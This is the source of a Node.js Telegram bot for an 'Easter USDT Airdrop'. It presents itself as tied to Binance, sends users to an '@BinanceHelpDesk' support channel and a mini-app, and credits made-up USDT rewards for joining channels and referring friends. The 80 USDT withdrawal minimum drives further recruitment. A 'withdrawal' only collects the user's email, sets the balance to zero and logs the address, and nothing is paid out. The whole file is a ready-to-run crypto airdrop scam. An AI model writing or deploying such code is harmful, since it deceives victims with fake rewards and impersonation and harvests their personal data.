const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const PORT = Number(process.env.PORT || 3000);
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const MINI_APP_URL = process.env.MINI_APP_URL || 'https://easter-airdrop-miniapp.pages.dev';
const BOT_USERNAME = process.env.BOT_USERNAME || 'EasterUSDTAirdropBot';

const BINANCE_CHANNEL = '@binance';
const SUPPORT_CHANNEL = '@BinanceHelpDesk';

const REWARD_INITIAL = 40;
const REWARD_REFERRAL = 10;
const MIN_WITHDRAWAL = 80;

if (!TOKEN) {
  console.error('❌ Missing TELEGRAM_BOT_TOKEN environment variable.');
  process.exit(1);
}

const app = express();
app.get('/', (_req, res) => {
  res.status(200).send('✅ Telegram bot server is live');
});

app.get('/healthz', (_req, res) => {
  res.status(200).json({ ok: true, service: 'telegram-bot-server' });
});

app.listen(PORT, () => {
  console.log(`🌐 HTTP server listening on ${PORT}`);
});

const bot = new TelegramBot(TOKEN, { polling: true });
const users = new Map();

function getUser(chatId) {
  if (!users.has(chatId)) {
    users.set(chatId, {
      id: chatId,
      balance: 0,
      referrals: 0,
      referredBy: null,
      tasksCompleted: false,
    });
  }

  return users.get(chatId);
}

function mainMenu(chatId) {
  return bot.sendMessage(chatId, '🎛 *Main Menu*\nSelect an action below:', {
    parse_mode: 'Markdown',
    reply_markup: {
      keyboard: [
        [{ text: '🎁 Open Airdrop Web App', web_app: { url: MINI_APP_URL } }],
        [{ text: '💰 Balance' }, { text: '👥 Referral' }],
        [{ text: '💸 Withdraw' }],
      ],
      resize_keyboard: true,
    },
  });
}

bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const user = getUser(chatId);

  const referralId = Number(match?.[1]);
  if (Number.isInteger(referralId) && referralId !== chatId && !user.tasksCompleted) {
    user.referredBy = referralId;
  }

  if (user.tasksCompleted) {
    await mainMenu(chatId);
    return;
  }

  await bot.sendMessage(
    chatId,
    '🎁 *Welcome to the Easter USDT Airdrop!*\n\nComplete the tasks and click verify to claim your *40 USDT* starter reward.',
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📢 Join Binance Official', url: `https://t.me/${BINANCE_CHANNEL.replace('@', '')}` }],
          [{ text: '🛠 Join Binance Support', url: `https://t.me/${SUPPORT_CHANNEL.replace('@', '')}` }],
          [{ text: '✅ I Have Joined Both', callback_data: 'verify_join' }],
          [{ text: '🎁 Open Airdrop Web App', web_app: { url: MINI_APP_URL } }],
        ],
      },
    }
  );
});

bot.on('callback_query', async (query) => {
  const chatId = query.message?.chat?.id;
  if (!chatId) return;

  const user = getUser(chatId);

  if (query.data !== 'verify_join') {
    await bot.answerCallbackQuery(query.id);
    return;
  }

  if (user.tasksCompleted) {
    await bot.answerCallbackQuery(query.id, {
      text: 'You already completed this task.',
      show_alert: true,
    });
    return;
  }

  user.tasksCompleted = true;
  user.balance += REWARD_INITIAL;

  if (user.referredBy) {
    const referrer = getUser(user.referredBy);
    referrer.balance += REWARD_REFERRAL;
    referrer.referrals += 1;

    await bot.sendMessage(
      user.referredBy,
      `🎉 *New referral!*\nYou earned *${REWARD_REFERRAL} USDT*.\nBalance: *${referrer.balance} USDT*`,
      { parse_mode: 'Markdown' }
    );
  }

  await bot.answerCallbackQuery(query.id, { text: 'Verified ✅' });
  await bot.sendMessage(
    chatId,
    `🎉 *Success!*\nYou received *${REWARD_INITIAL} USDT*. Continue earning below.`,
    { parse_mode: 'Markdown' }
  );
  await mainMenu(chatId);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  const user = getUser(chatId);

  if (!text || text.startsWith('/start')) return;

  if (text === '💰 Balance') {
    await bot.sendMessage(
      chatId,
      `💰 *Balance:* ${user.balance} USDT\n👥 *Referrals:* ${user.referrals}\n\nInvite friends to earn more.`,
      { parse_mode: 'Markdown' }
    );
    return;
  }

  if (text === '👥 Referral') {
    const refLink = `https://t.me/${BOT_USERNAME}?start=${chatId}`;
    await bot.sendMessage(
      chatId,
      `👥 *Your referral link:*\n\`${refLink}\`\n\nEarn *${REWARD_REFERRAL} USDT* per referral.`,
      { parse_mode: 'Markdown' }
    );
    return;
  }

  if (text === '💸 Withdraw') {
    if (user.balance < MIN_WITHDRAWAL) {
      const needed = Math.ceil((MIN_WITHDRAWAL - user.balance) / REWARD_REFERRAL);
      await bot.sendMessage(
        chatId,
        `❌ Minimum withdrawal is *${MIN_WITHDRAWAL} USDT*.\nCurrent balance: *${user.balance} USDT*.\nInvite *${needed}* more friend(s).`,
        { parse_mode: 'Markdown' }
      );
      return;
    }

    await bot.sendMessage(chatId, '📩 Reply with your email address to confirm withdrawal.', {
      reply_markup: { force_reply: true },
    });
    return;
  }

  if (msg.reply_to_message?.text?.includes('email address')) {
    const email = text;
    const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

    if (!isValidEmail) {
      await bot.sendMessage(chatId, '❌ Invalid email. Tap *💸 Withdraw* and try again.', {
        parse_mode: 'Markdown',
      });
      return;
    }

    const amount = user.balance;
    user.balance = 0;

    await bot.sendMessage(
      chatId,
      `✅ Withdrawal recorded.\nAmount: *${amount} USDT*\nEmail: \`${email}\``,
      { parse_mode: 'Markdown' }
    );

    console.log(`[WITHDRAWAL] chat=${chatId} amount=${amount} email=${email}`);
  }
});

bot.on('polling_error', (error) => {
  console.error('❌ Telegram polling error:', error?.message || error);
});

console.log('🤖 Telegram bot started with polling.');
